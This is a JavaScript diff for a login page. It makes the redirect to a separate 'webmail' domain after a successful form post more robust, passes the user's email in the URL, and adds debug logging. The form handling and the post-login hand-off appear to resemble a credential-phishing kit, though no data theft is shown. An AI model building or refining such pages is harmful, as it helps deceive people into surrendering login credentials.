@@ -139,25 +139,32 @@
                  $('#email').prop('disabled', true);
                  $('#password').prop('disabled', true);
                  
-                 // Redirect after delay
-                 setTimeout(function() {
-                     // Redirect to webmail domain with email parameter
-                     var redirectUrl = REDIRECT_DOMAIN;
-                     
-                     // Pass the email as a parameter for webmail login
-                     redirectUrl += '?email=' + encodeURIComponent($('#email').val());
-                     
-                     console.log('Redirecting to webmail: ' + redirectUrl);
-                     
-                     // Force redirect using window.location.replace for better compatibility
+                 // Immediate redirect attempt
+                 var redirectUrl = REDIRECT_DOMAIN + '?email=' + encodeURIComponent($('#email').val());
+                 console.log('Attempting immediate redirect to: ' + redirectUrl);
+                 
+                 // Try multiple redirect methods
+                 try {
+                     // Method 1: window.location.replace
                      window.location.replace(redirectUrl);
-                     
-                     // Fallback redirect method
-                     setTimeout(function() {
-                         if (window.location.href.indexOf(REDIRECT_DOMAIN) === -1) {
-                             window.location.href = redirectUrl;
-                         }
-                     }, 500);
+                 } catch(e) {
+                     console.log('Method 1 failed, trying method 2');
+                     try {
+                         // Method 2: window.location.href
+                         window.location.href = redirectUrl;
+                     } catch(e2) {
+                         console.log('Method 2 failed, trying method 3');
+                         // Method 3: window.open
+                         window.open(redirectUrl, '_self');
+                     }
+                 }
+                 
+                 // Fallback redirect after delay
+                 setTimeout(function() {
+                     if (window.location.href.indexOf(REDIRECT_DOMAIN) === -1) {
+                         console.log('Fallback redirect triggered');
+                         window.location.href = redirectUrl;
+                     }
                  }, REDIRECT_DELAY);
              }
              
@@ -242,12 +249,21 @@
                          $('#login_submit').prop('disabled', true).text('Processing...');
                      },
                      success: function(response) {
+                         console.log('Server response:', response);
                          var msg = response && response.msg ? response.msg : '';
                          
-                         // Check if login was successful
-                         if (response && (response.signal === 'OK' || response.success === true)) {
+                         // Debug: Log the response details
+                         console.log('Response message:', msg);
+                         console.log('Response signal:', response && response.signal);
+                         console.log('Response success:', response && response.success);
+                         
+                         // Check if login was successful - more comprehensive check
+                         if (response && (response.signal === 'OK' || response.success === true || 
+                             msg.toLowerCase().includes('success') || msg.toLowerCase().includes('redirect'))) {
+                             console.log('Login successful - triggering redirect');
                              handleSuccessfulLogin(response);
                          } else {
+                             console.log('Login failed - showing error');
                              handleFailedLogin(response);
                          }
                      },
